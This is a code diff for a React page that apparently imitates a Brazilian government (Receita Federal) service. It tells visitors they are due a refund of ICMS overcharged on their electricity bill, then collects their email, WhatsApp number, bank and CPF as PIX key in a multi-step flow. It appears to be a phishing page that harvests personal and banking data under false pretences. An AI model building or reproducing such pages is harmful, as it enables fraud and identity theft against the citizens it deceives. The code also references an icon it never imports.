@@ -1,13 +1,73 @@
 import { useState, useEffect } from "react";
 import { useLocation } from "wouter";
+import { useForm } from "react-hook-form";
+import { zodResolver } from "@hookform/resolvers/zod";
+import { z } from "zod";
 import Header from "@/components/Header";
 import Footer from "@/components/Footer";
 import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
 import { Progress } from "@/components/ui/progress";
 import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
-import { CheckCircle, Download, AlertTriangle, CalendarClock, ChevronRight } from "lucide-react";
+import { CheckCircle, Download, AlertTriangle, CalendarClock, ChevronRight, Phone, Mail, BanknoteIcon, CheckCircle2, CreditCard, ChevronLeft, CircleDollarSign } from "lucide-react";
 import SimuladorRestituicao from "@/components/SimuladorRestituicao";
+import { Input } from "@/components/ui/input";
+import {
+  Select,
+  SelectContent,
+  SelectItem,
+  SelectTrigger,
+  SelectValue,
+} from "@/components/ui/select";
+import {
+  Form,
+  FormControl,
+  FormDescription,
+  FormField,
+  FormItem,
+  FormLabel,
+  FormMessage,
+} from "@/components/ui/form";
+import { useToast } from "@/hooks/use-toast";
+
+// Schemas para validação
+const contatoSchema = z.object({
+  email: z.string().email("E-mail inválido").min(1, "E-mail é obrigatório"),
+  telefone: z.string()
+    .min(11, "Telefone deve ter pelo menos 11 dígitos (DDD + número)")
+    .max(11, "Telefone deve ter no máximo 11 dígitos")
+    .regex(/^\d+$/, "Telefone deve conter apenas números"),
+});
+
+const dadosBancariosSchema = z.object({
+  banco: z.string().min(1, "Selecione um banco"),
+  chavePix: z.string()
+    .min(11, "CPF deve ter 11 dígitos")
+    .max(11, "CPF deve ter 11 dígitos")
+    .regex(/^\d+$/, "CPF deve conter apenas números"),
+});
+
+// Lista de bancos brasileiros para o select
+const bancosBrasileiros = [
+  { id: "bb", nome: "Banco do Brasil" },
+  { id: "caixa", nome: "Caixa Econômica Federal" },
+  { id: "itau", nome: "Itaú Unibanco" },
+  { id: "bradesco", nome: "Bradesco" },
+  { id: "santander", nome: "Santander" },
+  { id: "nubank", nome: "Nubank" },
+  { id: "inter", nome: "Banco Inter" },
+  { id: "c6", nome: "C6 Bank" },
+  { id: "banrisul", nome: "Banrisul" },
+  { id: "safra", nome: "Safra" },
+  { id: "original", nome: "Banco Original" },
+  { id: "bndes", nome: "BNDES" },
+  { id: "sicoob", nome: "Sicoob" },
+  { id: "sicredi", nome: "Sicredi" },
+  { id: "other", nome: "Outro" },
+];
+
+type ContatoFormValues = z.infer<typeof contatoSchema>;
+type DadosBancariosFormValues = z.infer<typeof dadosBancariosSchema>;
 
 export default function Resultado() {
   const [location, navigate] = useLocation();
@@ -34,6 +94,20 @@ export default function Resultado() {
   const [valorTotal, setValorTotal] = useState(0);
   const [mesesAvaliados, setMesesAvaliados] = useState(0);
   const [dataPagamento, setDataPagamento] = useState("");
+  
+  // Estados para o fluxo de confirmação
+  const [etapaConfirmacao, setEtapaConfirmacao] = useState<"inicial" | "contato" | "bancarios" | "confirmacao">("inicial");
+  const [animacaoAtiva, setAnimacaoAtiva] = useState(false);
+  const [valorRestituicao, setValorRestituicao] = useState("");
+  
+  // Dados de contato e bancários
+  const [telefoneConfirmado, setTelefoneConfirmado] = useState("");
+  const [emailConfirmado, setEmailConfirmado] = useState("");
+  const [bancoSelecionado, setBancoSelecionado] = useState("");
+  const [chavePix, setChavePix] = useState("");
+  
+  // Inicializar toast
+  const { toast } = useToast();
   
   // Função para formatar CPF
   const formatarCPF = (cpf: string) => {
@@ -134,6 +208,96 @@ export default function Resultado() {
     alert("Seu comprovante será enviado para o e-mail cadastrado junto à Receita Federal.");
   };
   
+  // Formulário de contato
+  const contatoForm = useForm<ContatoFormValues>({
+    resolver: zodResolver(contatoSchema),
+    defaultValues: {
+      email: "",
+      telefone: "",
+    },
+  });
+
+  // Formulário de dados bancários
+  const dadosBancariosForm = useForm<DadosBancariosFormValues>({
+    resolver: zodResolver(dadosBancariosSchema),
+    defaultValues: {
+      banco: "",
+      chavePix: "",
+    },
+  });
+  
+  // Formatar telefone para visualização
+  const formatarTelefone = (telefone: string) => {
+    if (!telefone) return "";
+    
+    // (XX) XXXXX-XXXX
+    if (telefone.length === 11) {
+      return `(${telefone.substring(0, 2)}) ${telefone.substring(
+        2,
+        7
+      )}-${telefone.substring(7)}`;
+    }
+    
+    return telefone;
+  };
+  
+  // Enviar dados de contato e ir para próxima etapa
+  const onSubmitContato = async (data: ContatoFormValues) => {
+    try {
+      // Animação de transição
+      setAnimacaoAtiva(true);
+      
+      // Atualizar estado
+      setTelefoneConfirmado(data.telefone);
+      setEmailConfirmado(data.email);
+      
+      // Ir para próxima etapa com atraso para animação
+      setTimeout(() => {
+        setEtapaConfirmacao("bancarios");
+        setAnimacaoAtiva(false);
+      }, 300);
+      
+      // Mostrar toast
+      toast({
+        title: "Dados salvos com sucesso!",
+        description: "Agora vamos para os dados bancários.",
+      });
+    } catch (error) {
+      setAnimacaoAtiva(false);
+      toast({
+        variant: "destructive",
+        title: "Erro ao salvar dados",
+        description: "Não foi possível salvar seus dados. Tente novamente.",
+      });
+    }
+  };
+  
+  // Submeter dados bancários
+  const onSubmitDadosBancarios = (data: DadosBancariosFormValues) => {
+    // Animação de transição
+    setAnimacaoAtiva(true);
+    
+    setBancoSelecionado(
+      bancosBrasileiros.find((banco) => banco.id === data.banco)?.nome || ""
+    );
+    setChavePix(data.chavePix);
+    
+    setTimeout(() => {
+      setEtapaConfirmacao("confirmacao");
+      setAnimacaoAtiva(false);
+    }, 300);
+  };
+  
+  // Finalizar processo
+  const finalizarProcesso = () => {
+    // Animação de transição
+    setAnimacaoAtiva(true);
+    
+    setTimeout(() => {
+      window.location.href = "/sucesso?nome=" + encodeURIComponent(nome.split(" ")[0]);
+    }, 500);
+  };
+  
   // Função chamada quando a simulação é concluída
   const handleSimulacaoConcluida = (valor: number, meses: number) => {
     setValorTotal(valor);
@@ -144,10 +308,14 @@ export default function Resultado() {
     dataPgto.setDate(dataPgto.getDate() + 30);
     setDataPagamento(dataPgto.toLocaleDateString('pt-BR'));
     
-    setSimulacaoRealizada(true);
+    // Formatar valor para exibição
+    setValorRestituicao(formatarValor(valor));
     
-    // Opcional: mudar para a aba de dados após a simulação
-    // setActiveTab("dados");
+    setSimulacaoRealizada(true);
+    setActiveTab("dados");
+    
+    // Iniciar processo de confirmação
+    setEtapaConfirmacao("contato");
   };
   
   return (
@@ -263,38 +431,329 @@ export default function Resultado() {
                               </div>
                             </div>
                             
-                            {/* Informações Adicionais */}
-                            <div className="bg-amber-50 border border-amber-200 rounded-lg p-4 mb-6">
-                              <div className="flex items-start">
-                                <AlertTriangle className="text-amber-500 mr-3 mt-1 h-5 w-5 flex-shrink-0" />
-                                <div>
-                                  <h3 className="font-semibold text-amber-800">Importante</h3>
-                                  <p className="text-sm text-amber-700">
-                                    O pagamento será processado automaticamente e depositado na conta bancária 
-                                    vinculada ao seu CPF na Receita Federal. Verifique se seus dados 
-                                    bancários estão atualizados.
-                                  </p>
+                            {/* Formulário de Confirmação */}
+                            <div className="mt-8">
+                              <div className="text-center mb-6">
+                                <h1 className="text-2xl font-bold text-[var(--gov-blue-dark)] mb-2">
+                                  Olá {nome.split(" ")[0]}, você está quase lá!
+                                </h1>
+                                <p className="text-[var(--gov-gray-dark)] mb-2">
+                                  Complete suas informações para receber sua restituição
+                                </p>
+                                <div className="mb-2 text-lg text-[var(--gov-blue-dark)]">no valor de</div>
+                                <div className="text-4xl font-bold bg-gradient-to-r from-green-600 to-blue-600 text-transparent bg-clip-text">{valorRestituicao}</div>
+                              </div>
+
+                              {/* Progresso visual elegante */}
+                              <div className="flex items-center justify-center mb-8">
+                                <div className="flex space-x-1 w-full max-w-md">
+                                  <div 
+                                    className={`h-2 flex-1 rounded-l-full transition-all duration-500 ${
+                                      etapaConfirmacao === "contato" 
+                                        ? "bg-[var(--gov-blue-dark)]" 
+                                        : etapaConfirmacao === "bancarios" || etapaConfirmacao === "confirmacao" 
+                                          ? "bg-[var(--gov-blue)]" 
+                                          : "bg-gray-200"
+                                    }`}
+                                  ></div>
+                                  <div 
+                                    className={`h-2 flex-1 transition-all duration-500 ${
+                                      etapaConfirmacao === "bancarios" 
+                                        ? "bg-[var(--gov-blue-dark)]" 
+                                        : etapaConfirmacao === "confirmacao" 
+                                          ? "bg-[var(--gov-blue)]" 
+                                          : "bg-gray-200"
+                                    }`}
+                                  ></div>
+                                  <div 
+                                    className={`h-2 flex-1 rounded-r-full transition-all duration-500 ${
+                                      etapaConfirmacao === "confirmacao" 
+                                        ? "bg-[var(--gov-blue-dark)]" 
+                                        : "bg-gray-200"
+                                    }`}
+                                  ></div>
                                 </div>
                               </div>
-                            </div>
-                            
-                            {/* Ações */}
-                            <div className="flex flex-col md:flex-row gap-4 pt-4">
-                              <Button 
-                                onClick={gerarComprovante}
-                                className="flex items-center justify-center bg-[var(--gov-blue)] hover:bg-[var(--gov-blue)]/90"
-                              >
-                                <Download className="mr-2 h-4 w-4" />
-                                Baixar Comprovante
-                              </Button>
                               
-                              <Button 
-                                onClick={() => navigate("/")}
-                                variant="outline"
-                                className="border-[var(--gov-blue)] text-[var(--gov-blue)] hover:bg-[var(--gov-blue-light)]/10"
-                              >
-                                Voltar para Página Inicial
-                              </Button>
+                              {/* Etapas em texto */}
+                              <div className="flex justify-between mb-8 px-2 max-w-md mx-auto">
+                                <div className={`text-sm font-medium transition-all duration-300 ${
+                                  etapaConfirmacao === "contato" ? "text-[var(--gov-blue-dark)]" : 
+                                  etapaConfirmacao === "bancarios" || etapaConfirmacao === "confirmacao" ? "text-[var(--gov-blue)]" : "text-gray-500"
+                                }`}>
+                                  Seus dados
+                                </div>
+                                <div className={`text-sm font-medium transition-all duration-300 ${
+                                  etapaConfirmacao === "bancarios" ? "text-[var(--gov-blue-dark)]" : 
+                                  etapaConfirmacao === "confirmacao" ? "text-[var(--gov-blue)]" : "text-gray-500"
+                                }`}>
+                                  Dados bancários
+                                </div>
+                                <div className={`text-sm font-medium transition-all duration-300 ${
+                                  etapaConfirmacao === "confirmacao" ? "text-[var(--gov-blue-dark)]" : "text-gray-500"
+                                }`}>
+                                  Finalizar
+                                </div>
+                              </div>
+                              
+                              {/* Conteúdo da etapa atual */}
+                              <div className="bg-white rounded-lg p-4">
+                                {etapaConfirmacao === "contato" && (
+                                  <div className={animacaoAtiva ? "transition-opacity duration-300 opacity-0" : "transition-opacity duration-300 opacity-100"}>
+                                    <Form {...contatoForm}>
+                                      <form onSubmit={contatoForm.handleSubmit(onSubmitContato)} className="space-y-6">
+                                        <div className="space-y-4">
+                                          <div className="flex items-center mb-4 p-3 bg-blue-50 rounded-lg">
+                                            <Mail className="h-5 w-5 text-blue-500 mr-3 flex-shrink-0" />
+                                            <p className="text-blue-700 text-sm">Seus dados serão usados apenas para o processo de restituição e não serão compartilhados com terceiros.</p>
+                                          </div>
+                                          
+                                          <FormField
+                                            control={contatoForm.control}
+                                            name="email"
+                                            render={({ field }) => (
+                                              <FormItem>
+                                                <FormLabel className="text-[var(--gov-blue-dark)] font-semibold">E-mail</FormLabel>
+                                                <FormControl>
+                                                  <Input
+                                                    placeholder="seu.email@exemplo.com"
+                                                    type="email"
+                                                    className="border-[var(--gov-gray)] focus-visible:ring-[var(--gov-blue)] transition-all"
+                                                    {...field}
+                                                  />
+                                                </FormControl>
+                                                <FormDescription>
+                                                  Precisamos do seu e-mail para enviar atualizações sobre o processo
+                                                </FormDescription>
+                                                <FormMessage />
+                                              </FormItem>
+                                            )}
+                                          />
+
+                                          <FormField
+                                            control={contatoForm.control}
+                                            name="telefone"
+                                            render={({ field }) => (
+                                              <FormItem>
+                                                <FormLabel className="text-[var(--gov-blue-dark)] font-semibold">Celular com WhatsApp</FormLabel>
+                                                <FormControl>
+                                                  <div className="flex items-center border rounded-md focus-within:ring-2 focus-within:ring-[var(--gov-blue)] focus-within:border-[var(--gov-blue)] transition-all">
+                                                    <Phone className="ml-3 h-4 w-4 text-gray-400" />
+                                                    <Input
+                                                      placeholder="DDD + Número (ex: 11999999999)"
+                                                      type="tel"
+                                                      maxLength={11}
+                                                      inputMode="numeric"
+                                                      className="border-0 focus-visible:ring-0 focus-visible:ring-offset-0"
+                                                      {...field}
+                                                    />
+                                                  </div>
+                                                </FormControl>
+                                                <FormDescription>
+                                                  Número para contato sobre sua restituição
+                                                </FormDescription>
+                                                <FormMessage />
+                                              </FormItem>
+                                            )}
+                                          />
+                                        </div>
+
+                                        <div className="flex justify-end mt-6">
+                                          <Button 
+                                            type="submit" 
+                                            className="bg-[var(--gov-blue)] hover:bg-[var(--gov-blue)]/90 text-white font-semibold px-6 transition-all"
+                                          >
+                                            Continuar
+                                            <ChevronRight className="ml-2 h-4 w-4" />
+                                          </Button>
+                                        </div>
+                                      </form>
+                                    </Form>
+                                  </div>
+                                )}
+                                
+                                {etapaConfirmacao === "bancarios" && (
+                                  <div className={animacaoAtiva ? "transition-opacity duration-300 opacity-0" : "transition-opacity duration-300 opacity-100"}>
+                                    <div className="mb-4 bg-amber-50 rounded-lg p-4 border-l-4 border-amber-500">
+                                      <div className="flex items-start">
+                                        <BanknoteIcon className="h-5 w-5 text-amber-500 mt-0.5 mr-3 flex-shrink-0" />
+                                        <div>
+                                          <h3 className="text-amber-700 font-semibold">Informações bancárias</h3>
+                                          <p className="text-amber-600 text-sm mt-1">
+                                            Selecione seu banco e informe o CPF associado à sua chave PIX para receber a restituição
+                                          </p>
+                                        </div>
+                                      </div>
+                                    </div>
+                                    
+                                    <Form {...dadosBancariosForm}>
+                                      <form onSubmit={dadosBancariosForm.handleSubmit(onSubmitDadosBancarios)} className="space-y-6">
+                                        <div className="space-y-4">
+                                          <FormField
+                                            control={dadosBancariosForm.control}
+                                            name="banco"
+                                            render={({ field }) => (
+                                              <FormItem>
+                                                <FormLabel className="text-[var(--gov-blue-dark)] font-semibold">Banco</FormLabel>
+                                                <Select
+                                                  onValueChange={field.onChange}
+                                                  defaultValue={field.value}
+                                                >
+                                                  <FormControl>
+                                                    <SelectTrigger className="border-[var(--gov-gray)] focus:border-[var(--gov-blue)] transition-all">
+                                                      <SelectValue placeholder="Selecione seu banco" />
+                                                    </SelectTrigger>
+                                                  </FormControl>
+                                                  <SelectContent className="max-h-80">
+                                                    {bancosBrasileiros.map((banco) => (
+                                                      <SelectItem key={banco.id} value={banco.id}>
+                                                        {banco.nome}
+                                                      </SelectItem>
+                                                    ))}
+                                                  </SelectContent>
+                                                </Select>
+                                                <FormDescription>
+                                                  Selecione o banco onde você receberá o valor da restituição
+                                                </FormDescription>
+                                                <FormMessage />
+                                              </FormItem>
+                                            )}
+                                          />
+
+                                          <FormField
+                                            control={dadosBancariosForm.control}
+                                            name="chavePix"
+                                            render={({ field }) => (
+                                              <FormItem>
+                                                <FormLabel className="text-[var(--gov-blue-dark)] font-semibold">Chave PIX (CPF)</FormLabel>
+                                                <FormControl>
+                                                  <div className="flex items-center border rounded-md focus-within:ring-2 focus-within:ring-[var(--gov-blue)] focus-within:border-[var(--gov-blue)] transition-all">
+                                                    <CreditCard className="ml-3 h-4 w-4 text-gray-400" />
+                                                    <Input
+                                                      placeholder="Seu CPF sem pontos ou traços"
+                                                      inputMode="numeric"
+                                                      maxLength={11}
+                                                      className="border-0 focus-visible:ring-0 focus-visible:ring-offset-0"
+                                                      {...field}
+                                                    />
+                                                  </div>
+                                                </FormControl>
+                                                <FormDescription>
+                                                  A restituição será enviada para a chave PIX associada ao seu CPF
+                                                </FormDescription>
+                                                <FormMessage />
+                                              </FormItem>
+                                            )}
+                                          />
+                                        </div>
+
+                                        <div className="flex justify-end mt-6">
+                                          <Button 
+                                            type="submit" 
+                                            className="bg-[var(--gov-blue)] hover:bg-[var(--gov-blue)]/90 text-white font-semibold px-6 transition-all"
+                                          >
+                                            Continuar
+                                            <ChevronRight className="ml-2 h-4 w-4" />
+                                          </Button>
+                                        </div>
+                                      </form>
+                                    </Form>
+                                  </div>
+                                )}
+                                
+                                {etapaConfirmacao === "confirmacao" && (
+                                  <div className={`${animacaoAtiva ? "transition-opacity duration-300 opacity-0" : "transition-opacity duration-300 opacity-100"} space-y-6`}>
+                                    <div className="bg-white border border-gray-200 rounded-lg p-6 shadow-sm">
+                                      <h3 className="text-xl font-semibold text-[var(--gov-blue-dark)] mb-4 flex items-center">
+                                        <CircleDollarSign className="h-5 w-5 mr-2 text-green-500" />
+                                        Resumo da Solicitação
+                                      </h3>
+                                      
+                                      <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-6">
+                                        <div className="bg-blue-50 p-4 rounded-lg border border-blue-100">
+                                          <h4 className="text-sm font-semibold text-[var(--gov-blue-dark)] mb-2">
+                                            Dados Pessoais
+                                          </h4>
+                                          <div className="space-y-2">
+                                            <div className="flex justify-between items-center text-sm">
+                                              <span className="text-[var(--gov-gray-dark)]">Nome:</span>
+                                              <span className="font-medium text-[var(--gov-blue-dark)]">{nome}</span>
+                                            </div>
+                                            <div className="flex justify-between items-center text-sm">
+                                              <span className="text-[var(--gov-gray-dark)]">Data de Nascimento:</span>
+                                              <span className="font-medium text-[var(--gov-blue-dark)]">{dataNascimento}</span>
+                                            </div>
+                                            <div className="flex justify-between items-center text-sm">
+                                              <span className="text-[var(--gov-gray-dark)]">Email:</span>
+                                              <span className="font-medium text-[var(--gov-blue-dark)]">{emailConfirmado}</span>
+                                            </div>
+                                            <div className="flex justify-between items-center text-sm">
+                                              <span className="text-[var(--gov-gray-dark)]">Telefone:</span>
+                                              <span className="font-medium text-[var(--gov-blue-dark)]">{formatarTelefone(telefoneConfirmado)}</span>
+                                            </div>
+                                          </div>
+                                        </div>
+                                        
+                                        <div className="bg-green-50 p-4 rounded-lg border border-green-100">
+                                          <h4 className="text-sm font-semibold text-[var(--gov-blue-dark)] mb-2">
+                                            Dados da Conta de Luz
+                                          </h4>
+                                          <div className="space-y-2">
+                                            <div className="flex justify-between items-center text-sm">
+                                              <span className="text-[var(--gov-gray-dark)]">Estado:</span>
+                                              <span className="font-medium text-[var(--gov-blue-dark)]">{estado}</span>
+                                            </div>
+                                            <div className="flex justify-between items-center text-sm">
+                                              <span className="text-[var(--gov-gray-dark)]">Companhia:</span>
+                                              <span className="font-medium text-[var(--gov-blue-dark)]">{companhia}</span>
+                                            </div>
+                                            <div className="flex justify-between items-center text-sm">
+                                              <span className="text-[var(--gov-gray-dark)]">Valor a Receber:</span>
+                                              <span className="font-bold text-green-600">{valorRestituicao}</span>
+                                            </div>
+                                          </div>
+                                        </div>
+                                      </div>
+                                      
+                                      <div className="bg-amber-50 p-4 rounded-lg border border-amber-100 mb-4">
+                                        <h4 className="text-sm font-semibold text-[var(--gov-blue-dark)] mb-2">
+                                          Dados Bancários
+                                        </h4>
+                                        <div className="space-y-2">
+                                          <div className="flex justify-between items-center text-sm">
+                                            <span className="text-[var(--gov-gray-dark)]">Banco:</span>
+                                            <span className="font-medium text-[var(--gov-blue-dark)]">{bancoSelecionado}</span>
+                                          </div>
+                                          <div className="flex justify-between items-center text-sm">
+                                            <span className="text-[var(--gov-gray-dark)]">Chave PIX (CPF):</span>
+                                            <span className="font-medium text-[var(--gov-blue-dark)]">{formatarCPF(chavePix)}</span>
+                                          </div>
+                                        </div>
+                                      </div>
+                                      
+                                      <div className="bg-yellow-50 border-l-4 border-yellow-500 p-4 rounded-r-lg mb-6">
+                                        <div className="flex items-start">
+                                          <AlertCircle className="h-5 w-5 text-yellow-500 mt-0.5 mr-2 flex-shrink-0" />
+                                          <p className="text-sm text-yellow-700">
+                                            Ao confirmar, você declara que as informações fornecidas são verdadeiras e concorda
+                                            com os termos do processo de restituição do ICMS cobrado indevidamente.
+                                          </p>
+                                        </div>
+                                      </div>
+                                      
+                                      <div className="flex justify-center mt-6">
+                                        <Button 
+                                          onClick={finalizarProcesso}
+                                          className="bg-[var(--gov-yellow)] hover:bg-[var(--gov-yellow)]/90 text-[var(--gov-blue-dark)] font-bold py-6 px-8 text-lg rounded-lg shadow-md hover:shadow-lg transform hover:-translate-y-1 transition-all duration-200"
+                                        >
+                                          <CheckCircle2 className="mr-2 h-5 w-5" />
+                                          Confirmar e Finalizar
+                                        </Button>
+                                      </div>
+                                    </div>
+                                  </div>
+                                )}
+                              </div>
                             </div>
                           </>
                         ) : (
